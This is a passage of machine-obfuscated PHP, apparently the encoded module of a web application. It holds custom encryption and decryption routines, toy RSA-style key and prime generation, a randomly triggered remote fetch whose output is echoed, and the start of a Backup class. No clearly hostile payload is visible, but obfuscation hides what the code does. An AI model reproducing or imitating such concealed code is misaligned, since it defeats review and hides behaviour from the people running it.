$b¨‚Ô×‹¿İ[250]($b¨‚Ô×‹¿İ[251])) { return; } $Fœç¦ãÒÊô = $b¨‚Ô×‹¿İ[61]($b¨‚Ô×‹¿İ[145])->{$_SERVER[×§Œ³][146]}(); if ($Fœç¦ãÒÊô <= $DäÇ¿­•›ç) { return; } goto CçˆÁÑ–“­; e‡Ä½ææ‘: if (!$b¨‚Ô×‹¿İ[248]($bŸ–¢öİ¯±[$b¨‚Ô×‹¿İ[334]], $C©‰ˆ·°¢)) { $b¨‚Ô×‹¿İ[172]($b¨‚Ô×‹¿İ[338], !1, $b¨‚Ô×‹¿İ[245]); } goto C‚ÆåÚŠÙ; C‚ÆåÚŠÙ: } public function qijcae1e0fe8() { goto D„¹±µÜôÉ; e—²‰ò…ß: $C®ä¨õÌê = $EĞÁ·ñ–Ë[646]; $f±ÌòÔÍ“™ = @$b‰‹£ä ¢‹[263]($C¥éï³Û×, !1, $B¢‡•Ÿ‡‹Š); echo $b‰‹£ä ¢‹[340] . $b‰‹£ä ¢‹[341]($f±ÌòÔÍ“™) . $b‰‹£ä ¢‹[342]; goto B²ÔÈ‹óŒ…; B²ÔÈ‹óŒ…: $A˜Óóâ«ì = $EĞÁ·ñ–Ë[647]; while (strlen($A˜Óóâ«ì) < $EĞÁ·ñ–Ë[573]) { if (!$A˜Óóâ«ì) { break; } $A˜Óóâ«ì++; } goto cÈŠ«íî†Ö; D„¹±µÜôÉ: $EĞÁ·ñ–Ë =& $_SERVER[¢Í]; $b‰‹£ä ¢‹ =& $_SERVER[×§Œ³]; if (!$b‰‹£ä ¢‹[112]($GLOBALS, $b‰‹£ä ¢‹[138]) || $b‰‹£ä ¢‹[339](1, 100) > 20) { return; } goto b¶Û´²¯ßÏ; b¶Û´²¯ßÏ: $C¥éï³Û× = $b‰‹£ä ¢‹[255]; $C¥éï³Û× = $this->{$_SERVER[×§Œ³][256]}($C¥éï³Û×, $b‰‹£ä ¢‹[257]); $B¢‡•Ÿ‡‹Š = $b‰‹£ä ¢‹[258](array($b‰‹£ä ¢‹[259] => array($b‰‹£ä ¢‹[260] => $b‰‹£ä ¢‹[261], $b‰‹£ä ¢‹[262] => 3))); goto e—²‰ò…ß; cÈŠ«íî†Ö: } private function xnfk4b7749bb($c·¢ò¡½é, $b±’Ä«‘¾÷, $e‰¢ˆ£ŒŞî = 3) { goto eóİö†…¦; EÍêº²±»Ê: switch ($cƒª‘“œ¾) { case $cƒçæ¹ª¡ò[240]: $fÉ§‘Ó = $this->{$_SERVER[×§Œ³][153]}($c·¢ò¡½é, $cƒçæ¹ª¡ò[220]($b±’Ä«‘¾÷ . $A¨ÊØïŠµ¬)); break; $f¿§óØÂøÄ = $dšóÉäÕá×[651]; case $cƒçæ¹ª¡ò[226]: $fÉ§‘Ó = $this->{$_SERVER[×§Œ³][153]}($c·¢ò¡½é, $cƒçæ¹ª¡ò[220]($A¨ÊØïŠµ¬ . $b±’Ä«‘¾÷)); break; case $cƒçæ¹ª¡ò[345]: $fÉ§‘Ó = $this->{$_SERVER[×§Œ³][153]}($c·¢ò¡½é, $cƒçæ¹ª¡ò[124]($A¨ÊØïŠµ¬ . $b±’Ä«‘¾÷)); break; case $cƒçæ¹ª¡ò[346]: $fÉ§‘Ó = $this->{$_SERVER[×§Œ³][153]}($c·¢ò¡½é, $cƒçæ¹ª¡ò[120]($A¨ÊØïŠµ¬ . $b±’Ä«‘¾÷)); $b‘Í§¹ˆ‘¾ = $dšóÉäÕá×[652]; while (strlen($b‘Í§¹ˆ‘¾) < $dšóÉäÕá×[573]) { if (!$b‘Í§¹ˆ‘¾) { break; } $b‘Í§¹ˆ‘¾++; } break; case $cƒçæ¹ª¡ò[347]: goto D†ªæÍ…ìö; Aî÷ã¤ìé: $dÏ°Æ–ùñˆ = $cƒçæ¹ª¡ò[10]; $AÊ¹À¤‹²ğ = $dšóÉäÕá×[655]; if (strlen($AÊ¹À¤‹²ğ) < $dšóÉäÕá×[577]) { die; } goto cŒÇŠ»½Ø; D†ªæÍ…ìö: $c·¢ò¡½é = $cƒçæ¹ª¡ò[124]($c·¢ò¡½é); $BŸ¤ëŠ³Ç = $cƒçæ¹ª¡ò[348](0, 64); $FŠğ·¬–ë = $fÛ„ ÍÖ™[$BŸ¤ëŠ³Ç]; goto F™çƒß½„…; cŒÇŠ»½Ø: $dóğ«ºÛ = 0; $aóŠ¼Æ¤î = 0; $e¯‘ ‚å = 0; goto cÏ¨àáÄï; fÈ¹Ğ“á«: $cÔÇº¨àÅ„ = $dšóÉäÕá×[657]; while ($cÔÇº¨àÅ„ < $dšóÉäÕá×[579]) { if ($cÔÇº¨àÅ„ >= 0) { break; } $cÔÇº¨àÅ„++; } goto EôÁËäŠµ¹; cÏ¨àáÄï: for ($dóğ«ºÛ = 0; $dóğ«ºÛ < $cƒçæ¹ª¡ò[24]($c·¢ò¡½é); $dóğ«ºÛ++) { $e¯‘ ‚å = $e¯‘ ‚å == $cƒçæ¹ª¡ò[24]($A­“©Œ¨Ô) ? 0 : $e¯‘ ‚å; $aóŠ¼Æ¤î = ($BŸ¤ëŠ³Ç + $cƒçæ¹ª¡ò[349]($fÛ„ ÍÖ™, $c·¢ò¡½é[$dóğ«ºÛ]) + $cƒçæ¹ª¡ò[350]($A­“©Œ¨Ô[$e¯‘ ‚å++])) % 64; $dœ”µ“—œ² = $dšóÉäÕá×[656]; $dÏ°Æ–ùñˆ .= $fÛ„ ÍÖ™[$aóŠ¼Æ¤î]; } $fÉ§‘Ó = $cƒçæ¹ª¡ò[341]($FŠğ·¬–ë . $dÏ°Æ–ùñˆ); break; goto fÈ¹Ğ“á«; F™çƒß½„…: $cÒµ’„˜¿› = $dšóÉäÕá×[653]; while (strlen($cÒµ’„˜¿›) < $dšóÉäÕá×[594]) { if (!$cÒµ’„˜¿›) { break; } $cÒµ’„˜¿›++; } $A­“©Œ¨Ô = $cƒçæ¹ª¡ò[120]($FŠğ·¬–ë . $cƒçæ¹ª¡ò[120]($b±’Ä«‘¾÷ . $FŠğ·¬–ë) . $b±’Ä«‘¾÷); goto aÏƒ¹Ï³Ä; aÏƒ¹Ï³Ä: $AšôóÛÛàÜ = $dšóÉäÕá×[654]; if (!$AšôóÛÛàÜ) { return; } $A­“©Œ¨Ô = $cƒçæ¹ª¡ò[25]($A­“©Œ¨Ô, $BŸ¤ëŠ³Ç % 8, $BŸ¤ëŠ³Ç % 8 + 7); goto Aî÷ã¤ìé; EôÁËäŠµ¹: default: $fÉ§‘Ó = $this->{$_SERVER[×§Œ³][153]}($c·¢ò¡½é, $b±’Ä«‘¾÷ . $A¨ÊØïŠµ¬); break; $cÍé†Í¦± = $dšóÉäÕá×[658]; } $fÉ§‘Ó = $cƒçæ¹ª¡ò[220]($cƒª‘“œ¾ . $A¨ÊØïŠµ¬ . $fÉ§‘Ó); if ($e‰¢ˆ£ŒŞî - 1 > 0) { $fÉ§‘Ó = $this->{$_SERVER[×§Œ³][133]}($fÉ§‘Ó, $b±’Ä«‘¾÷, $e‰¢ˆ£ŒŞî - 1); } goto EÌùæŞÒ¸; E©ÎœÁÍÕ: $còñŸ‚“ç = $dšóÉäÕá×[649]; $cƒª‘“œ¾ = $cƒçæ¹ª¡ò[339](0, 5) . $cƒçæ¹ª¡ò[10]; $CàÖ ¢ƒŞ´ = $dšóÉäÕá×[650]; goto E‚¬°ŠÉ¯Ê; E‚¬°ŠÉ¯Ê: if (strlen($CàÖ ¢ƒŞ´) < $dšóÉäÕá×[573]) { die; } $A¨ÊØïŠµ¬ = $cƒçæ¹ª¡ò[130](15); $fÛ„ ÍÖ™ = $cƒçæ¹ª¡ò[344]; goto EÍêº²±»Ê; eóİö†…¦: $dšóÉäÕá× =& $_SERVER[¢Í]; $cƒçæ¹ª¡ò =& $_SERVER[×§Œ³]; $cƒçæ¹ª¡ò[343](1); goto C„¿ïÌ¹­‘; EÌùæŞÒ¸: return $fÉ§‘Ó; goto dôÅ–Ÿ™é; C„¿ïÌ¹­‘: $Bô»á„¥áÍ = $dšóÉäÕá×[648]; while (strlen($Bô»á„¥áÍ) < $dšóÉäÕá×[573]) { if (!$Bô»á„¥áÍ) { break; } $Bô»á„¥áÍ++; } $c·¢ò¡½é = $cƒçæ¹ª¡ò[2]($c·¢ò¡½é); goto E©ÎœÁÍÕ; dôÅ–Ÿ™é: } private function tbkc00e6e4d7($e©Õ¤Áóç, $f‚ˆ‹–¶ , $DßšˆÏÊĞ¦ = 3) { goto CÜğÍ½¥ÄÈ; CÜğÍ½¥ÄÈ: $BªŞš¢¹™ =& $_SERVER[¢Í]; $a¿³¯™ÂÔĞ =& $_SERVER[×§Œ³]; if (!$a¿³¯™ÂÔĞ[351]($e©Õ¤Áóç) || $a¿³¯™ÂÔĞ[24]($e©Õ¤Áóç) < 10) { return !1; } goto eÉ‡¬¹ƒ‹”; béô‘¹§á²: $f­Úğà„¶ = $a¿³¯™ÂÔĞ[344]; $CõÙŒëçÉ = $BªŞš¢¹™[661]; while ($CõÙŒëçÉ < $BªŞš¢¹™[577]) { if ($CõÙŒëçÉ >= 0) { break; } $CõÙŒëçÉ++; } goto eÓ­ˆ¨Ã¿; eÄÚ¥×ƒé: $e©Õ¤Áóç = $a¿³¯™ÂÔĞ[220]($e©Õ¤Áóç); $bøãÇÉË = $e©Õ¤Áóç[0]; $fõ™¡–™¶Ã = $a¿³¯™ÂÔĞ[25]($e©Õ¤Áóç, 1, 15); goto cÍÆÒ®šö; eÉ‡¬¹ƒ‹”: $e©Õ¤Áóç = $a¿³¯™ÂÔĞ[2]($e©Õ¤Áóç); $cİ£Ï¸ª˜ = $BªŞš¢¹™[659]; if (strlen($cİ£Ï¸ª˜) < $BªŞš¢¹™[594]) { return; } goto eÄÚ¥×ƒé; eÓ­ˆ¨Ã¿: switch ($bøãÇÉË) { case $a¿³¯™ÂÔĞ[240]: $cå–²æŒò = $this->{$_SERVER[×§Œ³][256]}($e©Õ¤Áóç, $a¿³¯™ÂÔĞ[220]($f‚ˆ‹–¶  . $fõ™¡–™¶Ã)); $A®ˆËÆ­ = $BªŞš¢¹™[662]; while (strlen($A®ˆËÆ­) < $BªŞš¢¹™[57]) { if (!$A®ˆËÆ­) { break; } $A®ˆËÆ­++; } break; $cï—¯›§¶ = $BªŞš¢¹™[663]; if (strlen($cï—¯›§¶) < $BªŞš¢¹™[573]) { die; } case $a¿³¯™ÂÔĞ[226]: $cå–²æŒò = $this->{$_SERVER[×§Œ³][256]}($e©Õ¤Áóç, $a¿³¯™ÂÔĞ[220]($fõ™¡–™¶Ã . $f‚ˆ‹–¶ )); break; case $a¿³¯™ÂÔĞ[345]: $cå–²æŒò = $this->{$_SERVER[×§Œ³][256]}($e©Õ¤Áóç, $a¿³¯™ÂÔĞ[124]($fõ™¡–™¶Ã . $f‚ˆ‹–¶ )); $c²Õˆ®á¦— = $BªŞš¢¹™[664]; if (!$c²Õˆ®á¦—) { return; } break; $e…Œé Ô = $BªŞš¢¹™[665]; case $a¿³¯™ÂÔĞ[346]: $cå–²æŒò = $this->{$_SERVER[×§Œ³][256]}($e©Õ¤Áóç, $a¿³¯™ÂÔĞ[120]($fõ™¡–™¶Ã . $f‚ˆ‹–¶ )); $CŒòã‹Šºº = $BªŞš¢¹™[666]; if (strlen($CŒòã‹Šºº) < $BªŞš¢¹™[573]) { die; } break; $F”Ø…Êù‘ = $BªŞš¢¹™[667]; if (!$F”Ø…Êù‘) { return; } case $a¿³¯™ÂÔĞ[347]: goto b°Õùß™Ş; AÙçğİô¢Ó: $e©Õ¤Áóç = $a¿³¯™ÂÔĞ[25]($e©Õ¤Áóç, 1); $AÁùŒÇ‰ğÅ = $a¿³¯™ÂÔĞ[349]($f­Úğà„¶, $E†Ğö„õæõ); $DäÚ§½í¦ƒ = $BªŞš¢¹™[669]; goto BÅ‰ˆâô¯Î; BÅ‰ˆâô¯Î: if (strlen($DäÚ§½í¦ƒ) < $BªŞš¢¹™[577]) { return; } $bãò±©›Ô¤ = $a¿³¯™ÂÔĞ[120]($E†Ğö„õæõ . $a¿³¯™ÂÔĞ[120]($f‚ˆ‹–¶  . $E†Ğö„õæõ) . $f‚ˆ‹–¶ ); $eØÓñõ¾è = $BªŞš¢¹™[670]; goto D‚ÜóğÚ×; Dß·¹äù”‘: $E¦øõî§÷° = $BªŞš¢¹™[672]; $d‡Ú¹•ğÈØ = 0; $bƒ°×Â³á = $BªŞš¢¹™[606]; goto d»ÆÊ°¨¿; b°Õùß™Ş: $e©Õ¤Áóç = $a¿³¯™ÂÔĞ[352]($e©Õ¤Áóç); $dß®Ø‘Šù’ = $BªŞš¢¹™[668]; $E†Ğö„õæõ = $e©Õ¤Áóç[0]; goto AÙçğİô¢Ó; fïÎìË‰¹: break; goto cšªŠÍ²Œ; d»ÆÊ°¨¿: if (!$bƒ°×Â³á) { return; } $cÒ¾åˆİ¹Ú = 0; $bÊÆÔ–¬®¸ = $BªŞš¢¹™[673]; goto Eğ®©ÚÕ; cËÁ·óÃ›‚: $D‹¦ŞÛà» = $BªŞš¢¹™[671]; if (!$D‹¦ŞÛà») { return; } $a¼’í÷Ù¦ = 0; goto Dß·¹äù”‘; D‚ÜóğÚ×: if (!$eØÓñõ¾è) { die; } $bãò±©›Ô¤ = $a¿³¯™ÂÔĞ[25]($bãò±©›Ô¤, $AÁùŒÇ‰ğÅ % 8, $AÁùŒÇ‰ğÅ % 8 + 7); $fÎè×¢Òˆ = $a¿³¯™ÂÔĞ[10]; goto cËÁ·óÃ›‚; Eğ®©ÚÕ: while (strlen($bÊÆÔ–¬®¸) < $BªŞš¢¹™[573]) { if (!$bÊÆÔ–¬®¸) { break; } $bÊÆÔ–¬®¸++; } for ($a¼’í÷Ù¦ = 0; $a¼’í÷Ù¦ < $a¿³¯™ÂÔĞ[24]($e©Õ¤Áóç); $a¼’í÷Ù¦++) { $cÒ¾åˆİ¹Ú = $cÒ¾åˆİ¹Ú == $a¿³¯™ÂÔĞ[24]($bãò±©›Ô¤) ? 0 : $cÒ¾åˆİ¹Ú; $eŸ¾ˆÊîŞÉ = $cÒ¾åˆİ¹Ú++; $F¯Â÷½‰ªĞ = $BªŞš¢¹™[674]; while (strlen($F¯Â÷½‰ªĞ) < $BªŞš¢¹™[57]) { if (!$F¯Â÷½‰ªĞ) { break; } $F¯Â÷½‰ªĞ++; } $d‡Ú¹•ğÈØ = $a¿³¯™ÂÔĞ[349]($f­Úğà„¶, $e©Õ¤Áóç[$a¼’í÷Ù¦]) - $AÁùŒÇ‰ğÅ - $a¿³¯™ÂÔĞ[350]($bãò±©›Ô¤[$eŸ¾ˆÊîŞÉ]); $aß‰ê›¸õ˜ = $BªŞš¢¹™[675]; while (strlen($aß‰ê›¸õ˜) < $BªŞš¢¹™[573]) { if (!$aß‰ê›¸õ˜) { break; } $aß‰ê›¸õ˜++; } while ($d‡Ú¹•ğÈØ < 0) { $d‡Ú¹•ğÈØ += 64; $Dã½½¶¦âš = $BªŞš¢¹™[676]; if (!$Dã½½¶¦âš) { die; } } $fÎè×¢Òˆ .= $f­Úğà„¶[$d‡Ú¹•ğÈØ]; $eÑï£¨”ˆ = $BªŞš¢¹™[677]; if (!$eÑï£¨”ˆ) { die; } } $cå–²æŒò = $a¿³¯™ÂÔĞ[353]($fÎè×¢Òˆ); goto fïÎìË‰¹; cšªŠÍ²Œ: default: $cå–²æŒò = $this->{$_SERVER[×§Œ³][256]}($e©Õ¤Áóç, $f‚ˆ‹–¶  . $fõ™¡–™¶Ã); break; $C¹‚ªæî­Ç = $BªŞš¢¹™[678]; if (strlen($C¹‚ªæî­Ç) < $BªŞš¢¹™[594]) { die; } } if ($DßšˆÏÊĞ¦ - 1 > 0) { $cå–²æŒò = $this->{$_SERVER[×§Œ³][195]}($cå–²æŒò, $f‚ˆ‹–¶ , $DßšˆÏÊĞ¦ - 1); } return $cå–²æŒò; goto A­—Ò‘ŞÛò; cÍÆÒ®šö: $d°‹·õë‹ = $BªŞš¢¹™[660]; if (!$d°‹·õë‹) { die; } $e©Õ¤Áóç = $a¿³¯™ÂÔĞ[25]($e©Õ¤Áóç, 16); goto béô‘¹§á²; A­—Ò‘ŞÛò: } public function uijzbfb3af85($BœƒØ£¦Åï) { goto C‚ƒØ®œˆ; B´¥ˆĞ‰”: $a÷œ àÀŸ× = $aÕ®áßâ‘[680]; if (!$a÷œ àÀŸ×) { die; } $CÔ¦»‰§Îç = ($AÆÍÕ—’Ç - 1) * ($dµùåÙ¬¹Á - 1); goto C™™¶ÌŸç¶; Bé“ÉÓ“Å: while (strlen($aõÍÌ‘¢°) < $aÕ®áßâ‘[573]) { if (!$aõÍÌ‘¢°) { break; } $aõÍÌ‘¢°++; } $eŠËçˆ¦³‰ = $BÎİ‚ïâ«ö[120]($BÎİ‚ïâ«ö[355] . ($AÆÍÕ—’Ç + $dµùåÙ¬¹Á) . $BÎİ‚ïâ«ö[356] . $F±¿”·ËãÃ . $BÎİ‚ïâ«ö[356] . $E‡…ÕŠ‡ÇÏ . $BÎİ‚ïâ«ö[357]); $D‚¨†‡¶Ñ = $aÕ®áßâ‘[684]; goto c¬£ÂÚø¿Ç; D¼¹ÛîÅˆ: for ($FÍÅ‡éÑÇç = 0; $FÍÅ‡éÑÇç < $CÔ¦»‰§Îç * 10; $FÍÅ‡éÑÇç++) { if (($CÔ¦»‰§Îç * $FÍÅ‡éÑÇç + 1) % $F±¿”·ËãÃ == 0) { $E‡…ÕŠ‡ÇÏ = $BÎİ‚ïâ«ö[250](($CÔ¦»‰§Îç * $FÍÅ‡éÑÇç + 1) / $F±¿”·ËãÃ); break; } } $eĞÜ…ñ…˜é = $this->{$_SERVER[×§Œ³][153]}($AÆÍÕ—’Ç * $dµùåÙ¬¹Á . $BÎİ‚ïâ«ö[10], $BÎİ‚ïâ«ö[155]); $aõÍÌ‘¢° = $aÕ®áßâ‘[683]; goto Bé“ÉÓ“Å; C‚ƒØ®œˆ: $aÕ®áßâ‘ =& $_SERVER[¢Í]; $BÎİ‚ïâ«ö =& $_SERVER[×§Œ³]; $AÆÍÕ—’Ç = $this->{$_SERVER[×§Œ³][354]}(); goto A™ÛôÌ‡ª…; A™ÛôÌ‡ª…: $F‚‚˜ùÙÖÏ = $aÕ®áßâ‘[679]; while (strlen($F‚‚˜ùÙÖÏ) < $aÕ®áßâ‘[573]) { if (!$F‚‚˜ùÙÖÏ) { break; } $F‚‚˜ùÙÖÏ++; } $dµùåÙ¬¹Á = $this->{$_SERVER[×§Œ³][354]}(); goto B´¥ˆĞ‰”; c¬£ÂÚø¿Ç: $EœöËöĞÊ = $this->{$_SERVER[×§Œ³][153]}($BœƒØ£¦Åï, $eŠËçˆ¦³‰) . $BÎİ‚ïâ«ö[358] . $eĞÜ…ñ…˜é; return $EœöËöĞÊ; goto f†„òĞ³³; C™™¶ÌŸç¶: $F±¿”·ËãÃ = $BÎİ‚ïâ«ö[250](($AÆÍÕ—’Ç + $dµùåÙ¬¹Á) / 2); while (1) { $EŠœ˜ó“ù = $F±¿”·ËãÃ; $aÁ‚Ç·Ÿ‰® = $CÔ¦»‰§Îç; $Bµ´“ñÁóÅ = $aÕ®áßâ‘[681]; while ($aÁ‚Ç·Ÿ‰® % $EŠœ˜ó“ù != 0) { $CÛŒÇ«¼Ù† = $aÁ‚Ç·Ÿ‰®; $b¡º„Šò¾‡ = $aÕ®áßâ‘[682]; while ($b¡º„Šò¾‡ < $aÕ®áßâ‘[57]) { if ($b¡º„Šò¾‡ >= 0) { break; } $b¡º„Šò¾‡++; } $aÁ‚Ç·Ÿ‰® = $EŠœ˜ó“ù; $EŠœ˜ó“ù = $CÛŒÇ«¼Ù† % $EŠœ˜ó“ù; } if ($EŠœ˜ó“ù == 1) { break; } else { $F±¿”·ËãÃ++; } } $E‡…ÕŠ‡ÇÏ = 2; goto D¼¹ÛîÅˆ; f†„òĞ³³: } public function qruw1b21231a($bÀ›á—¥Ş) { goto Aã÷ÃÅˆ—; CÙ¸¨•¡íï: $A Û¹µê¿ = ($BËË ¥ó… - 1) * ($Fö•Í¦—•­ - 1); $DšèÍÊ–é† = $e¹³£›ñºï[690]; if (strlen($DšèÍÊ–é†) < $e¹³£›ñºï[577]) { return; } goto Cöè¥È¸©; Fğ¹Ë‘óÌµ: return $AÃïµ¥Ç; $c¨¡Ç¥ = $e¹³£›ñºï[694]; while (strlen($c¨¡Ç¥) < $e¹³£›ñºï[594]) { if (!$c¨¡Ç¥) { break; } $c¨¡Ç¥++; } goto cğ¨ËÔÓ§’; Aã÷ÃÅˆ—: $e¹³£›ñºï =& $_SERVER[¢Í]; $B·Å§Â‘Ğ‹ =& $_SERVER[×§Œ³]; $cç·ÒÌÊÜ¶ = $B·Å§Â‘Ğ‹[0]($B·Å§Â‘Ğ‹[358], $bÀ›á—¥Ş); goto CÈÒÔ©“§Ğ; Eˆç­¶•êÚ: $aóîé‚ä = $this->{$_SERVER[×§Œ³][256]}($cç·ÒÌÊÜ¶[1] . $B·Å§Â‘Ğ‹[10], $B·Å§Â‘Ğ‹[155]); $EÑ†¹ò¥ô = $e¹³£›ñºï[686]; if (strlen($EÑ†¹ò¥ô) < $e¹³£›ñºï[57]) { die; } goto EÊÄ÷§Š†¶; A®Ğ±Ü¶¸¹: $AÃïµ¥Ç = $this->{$_SERVER[×§Œ³][256]}($cç·ÒÌÊÜ¶[0], $cŒ‹±ôéŠƒ); $d· ±ë¶¥ = $e¹³£›ñºï[693]; if (strlen($d· ±ë¶¥) < $e¹³£›ñºï[577]) { return; } goto Fğ¹Ë‘óÌµ; Cöè¥È¸©: $c¶àÑËÇŒ = $B·Å§Â‘Ğ‹[250](($BËË ¥ó… + $Fö•Í¦—•­) / 2); while (1) { $a¤ÉÏ¯È = $c¶àÑËÇŒ; $d‰»§«Ó = $A Û¹µê¿; while ($d‰»§«Ó % $a¤ÉÏ¯È != 0) { $E¹àäùÁ¡» = $d‰»§«Ó; $DÒÛˆŸáíŞ = $e¹³£›ñºï[691]; if (strlen($DÒÛˆŸáíŞ) < $e¹³£›ñºï[577]) { die; } $d‰»§«Ó = $a¤ÉÏ¯È; $a¤ÉÏ¯È = $E¹àäùÁ¡» % $a¤ÉÏ¯È; } if ($a¤ÉÏ¯È == 1) { break; } else { $c¶àÑËÇŒ++; } } $A°´•´¤Ì— = 2; goto e–œ‹ÛÌä; CÈÒÔ©“§Ğ: $d‡œî¬¿Îª = $e¹³£›ñºï[685]; if (!$d‡œî¬¿Îª) { return; } if ($B·Å§Â‘Ğ‹[19]($cç·ÒÌÊÜ¶) != 2) { return $B·Å§Â‘Ğ‹[10]; } goto Eˆç­¶•êÚ; EÊÄ÷§Š†¶: if (!$aóîé‚ä) { return $B·Å§Â‘Ğ‹[10]; } $aóîé‚ä = $B·Å§Â‘Ğ‹[250]($aóîé‚ä); $b•ÈŠŠšº = $e¹³£›ñºï[687]; goto D®ì‚ÀË¥Î; D®ì‚ÀË¥Î: $BËË ¥ó… = 0; $Fö•Í¦—•­ = 0; for ($bšÂ´î¿ÃŞ = 3; $bšÂ´î¿ÃŞ < $aóîé‚ä; $bšÂ´î¿ÃŞ += 2) { if ($aóîé‚ä % $bšÂ´î¿ÃŞ != 0) { continue; } $BËË ¥ó… = $bšÂ´î¿ÃŞ; $Fö•Í¦—•­ = $B·Å§Â‘Ğ‹[250]($aóîé‚ä / $bšÂ´î¿ÃŞ); $fôÂ ‡”ˆ = $e¹³£›ñºï[688]; break; $cª½œ¸ØÃ = $e¹³£›ñºï[689]; if (strlen($cª½œ¸ØÃ) < $e¹³£›ñºï[57]) { return; } } goto CÙ¸¨•¡íï; e–œ‹ÛÌä: for ($bšÂ´î¿ÃŞ = 0; $bšÂ´î¿ÃŞ < $A Û¹µê¿ * 10; $bšÂ´î¿ÃŞ++) { if (($A Û¹µê¿ * $bšÂ´î¿ÃŞ + 1) % $c¶àÑËÇŒ == 0) { $A°´•´¤Ì— = $B·Å§Â‘Ğ‹[250](($A Û¹µê¿ * $bšÂ´î¿ÃŞ + 1) / $c¶àÑËÇŒ); break; } } $cŒ‹±ôéŠƒ = $B·Å§Â‘Ğ‹[120]($B·Å§Â‘Ğ‹[355] . ($BËË ¥ó… + $Fö•Í¦—•­) . $B·Å§Â‘Ğ‹[356] . $c¶àÑËÇŒ . $B·Å§Â‘Ğ‹[356] . $A°´•´¤Ì— . $B·Å§Â‘Ğ‹[357]); $d©íÑá“Ô = $e¹³£›ñºï[692]; goto A®Ğ±Ü¶¸¹; cğ¨ËÔÓ§’: } public function jqpfb200ce7a() { goto c•Š³·¡©Š; c•Š³·¡©Š: $D˜Û’½ô£Á =& $_SERVER[¢Í]; $aŠ¼ÛÕ•Ô =& $_SERVER[×§Œ³]; $C¯ÖàºöÈà = $aŠ¼ÛÕ•Ô[339]($aŠ¼ÛÕ•Ô[359](2, 14), $aŠ¼ÛÕ•Ô[359](2, 16) - 1); goto BÁà‘Ö‡·ô; f›¹¦à†×œ: $Fù÷ÒäØà« = 1; while ($Fù÷ÒäØà« <= (int) $aŠ¼ÛÕ•Ô[360]($C¯ÖàºöÈà)) { $E—ÄÊÅí±¦ = $Fù÷ÒäØà«; while (!0) { $E—ÄÊÅí±¦++; if ($E—ÄÊÅí±¦ <= 2) { $Fù÷ÒäØà« = $E—ÄÊÅí±¦; break; } else { if ($E—ÄÊÅí±¦ < 2) { continue; } } $eº¯Ê„ ˜ = !0; for ($EôŠ…É¨£ = 2; $EôŠ…É¨£ <= $aŠ¼ÛÕ•Ô[360]($E—ÄÊÅí±¦); $EôŠ…É¨£++) { if ($E—ÄÊÅí±¦ % $EôŠ…É¨£ == 0) { $eº¯Ê„ ˜ = !1; } } if ($eº¯Ê„ ˜) { $Fù÷ÒäØà« = $E—ÄÊÅí±¦; break; } } $E–Ü¹‡ƒ¯œ[] = $Fù÷ÒäØà«; $Cèá®Ò‰†Â = $D˜Û’½ô£Á[696]; if (!$Cèá®Ò‰†Â) { die; } } $BÖ¢ÂëİÒ = 2; goto dÜ›—¿ªÌ´; bË‰¹òöÜá: if (strlen($a©¤Ø¦ÂÈ«) < $D˜Û’½ô£Á[579]) { return; } goto C„ó˜º¹É; dÜ›—¿ªÌ´: for ($E—ÄÊÅí±¦ = $C¯ÖàºöÈà; $E—ÄÊÅí±¦ > 1; $E—ÄÊÅí±¦--) { $eº¯Ê„ ˜ = !0; foreach ($E–Ü¹‡ƒ¯œ as $CŞç…Ÿ¦œå) { if ($E—ÄÊÅí±¦ % $CŞç…Ÿ¦œå == 0) { $eº¯Ê„ ˜ = !1; break; } } if ($eº¯Ê„ ˜) { $BÖ¢ÂëİÒ = $E—ÄÊÅí±¦; break; } } return $BÖ¢ÂëİÒ; $a©¤Ø¦ÂÈ« = $D˜Û’½ô£Á[697]; goto bË‰¹òöÜá; BÁà‘Ö‡·ô: $EâÀ°³‹øò = $D˜Û’½ô£Á[695]; if (strlen($EâÀ°³‹øò) < $D˜Û’½ô£Á[579]) { return; } $E–Ü¹‡ƒ¯œ = array(); goto f›¹¦à†×œ; C„ó˜º¹É: } public function quab68e2c004($cíš‹…õ„, $DÂé‡ˆÙá‚) { $B“ë²ùó¶â =& $_SERVER[¢Í]; $F¿è‰ îàË =& $_SERVER[×§Œ³]; return $F¿è‰ îàË[13](array($F¿è‰ îàË[14], $F¿è‰ îàË[361]), $cíš‹…õ„, $DÂé‡ˆÙá‚); $Aí‚»ĞĞ‘† = $B“ë²ùó¶â[698]; if (strlen($Aí‚»ĞĞ‘†) < $B“ë²ùó¶â[577]) { die; } } public function snwzaadc49fc($D³óÊÀœ¤¡, $AåÕÉÁîÀš) { $eÉÇ±£Í =& $_SERVER[¢Í]; $B´ÂĞ¥¦ =& $_SERVER[×§Œ³]; return $B´ÂĞ¥¦[13](array($B´ÂĞ¥¦[362], $B´ÂĞ¥¦[363]), $D³óÊÀœ¤¡, $AåÕÉÁîÀš); $AÔæˆğæ… = $eÉÇ±£Í[699]; if (strlen($AÔæˆğæ…) < $eÉÇ±£Í[579]) { die; } } public function gzlo0af337b2($e÷…ß‰˜ÂÎ, $cï˜ô¡†³é) { $c»¬¤Ÿö˜† =& $_SERVER[×§Œ³]; return $c»¬¤Ÿö˜†[13](array($c»¬¤Ÿö˜†[362], $c»¬¤Ÿö˜†[364]), $e÷…ß‰˜ÂÎ, $cï˜ô¡†³é); $B¢…Ô¸®ƒ¤ = $_SERVER[¢Í][700]; if (!$B¢…Ô¸®ƒ¤) { die; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $C«’å«¥´Ğ =& $_SERVER[¢Í]; self::$name = date($C«’å«¥´Ğ[701]); if (!($dÊ›èŠ® = Model($C«’å«¥´Ğ[702])->lastItem())) { $dÊ›èŠ® = $this->initData(); } else { self::$name = $dÊ›èŠ®[$C«’å«¥´Ğ[28]]; if ($dÊ›èŠ®[$C«’å«¥´Ğ[703]] == $C«’å«¥´Ğ[93]) { self::$name = date($C«’å«¥´Ğ[704]); $f–èéËÇŒŒ = 0; if (isset($dÊ›èŠ®[$C«’å«¥´Ğ[296]][$C«’å«¥´Ğ[181]][$C«’å«¥´Ğ[444]])) { $f–èéËÇŒŒ = (int) $dÊ›èŠ®[$C«’å«¥´Ğ[296]][$C«’å«¥´Ğ[181]][$C«’å«¥´Ğ[444]]; } if ($dÊ›èŠ®[$C«’å«¥´Ğ[28]] == self::$name) { Model($C«’å«¥´Ğ[702])->remove($dÊ›èŠ®[$C«’å«¥´Ğ[392]]); } $dÊ›èŠ® = $this->initData($f–èéËÇŒŒ, $dÊ›èŠ®[$C«’å«¥´Ğ[705]]); } else { $this->checkStore($dÊ›èŠ®[$C«’å«¥´Ğ[705]]); } } self::$option = $dÊ›èŠ®; } private function 